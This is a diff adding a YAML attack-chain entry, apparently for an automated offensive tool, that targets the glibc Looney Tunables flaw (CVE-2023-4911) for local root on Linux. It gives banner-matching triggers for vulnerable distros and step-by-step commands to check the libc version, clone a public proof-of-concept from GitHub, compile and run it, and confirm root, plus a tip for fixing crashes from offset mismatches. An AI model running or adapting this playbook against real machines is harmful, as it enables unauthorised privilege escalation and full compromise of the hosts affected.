@@ -1,0 +1,46 @@
+chain_id: looney_tunables_cve_2023_4911
+title: "Linux privesc — CVE-2023-4911 Looney Tunables (glibc) local root"
+severity: CRITICAL
+tags: [linux, privesc, glibc, tunables, cve-2023-4911]
+
+trigger:
+  any_of:
+    - { banner_pattern: "(?i)(rhel|centos|fedora|ubuntu|debian).*(2[2-3]\\.04|3[5-9]|9)" }
+    - { kind: "suid-binary", banner_pattern: "(?i)/su$" }
+
+description: |
+  Looney Tunables (CVE-2023-4911) is a buffer overflow in glibc's
+  ld.so when parsing the `GLIBC_TUNABLES` environment variable. Any
+  SUID binary triggers the vulnerable codepath. Affects Fedora 37/38,
+  Ubuntu 22.04/23.04, Debian 12/13, RHEL/CentOS Stream 9 prior to the
+  October 2023 patch.
+
+steps:
+  - id: 1
+    title: "Confirm the libc version is in range"
+    command: |
+      ldd --version | head -1
+      # Vulnerable: 2.34 → 2.38 (mostly).
+
+  - id: 2
+    title: "Drop and run the canonical PoC"
+    command: |
+      git clone https://github.com/leesh3288/CVE-2023-4911.git
+      cd CVE-2023-4911
+      gcc -o exploit exploit.c
+      ./exploit
+
+  - id: 3
+    title: "Verify root"
+    command: id
+
+common_errors:
+  - error: "Segfault — exploit aborted"
+    solution: |
+      The PoC ships hard-coded offsets per distro. Try the variants in
+      the README; or check qualys's writeup for the exact offset for
+      your build of ld.so.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2023-4911
+  - https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt
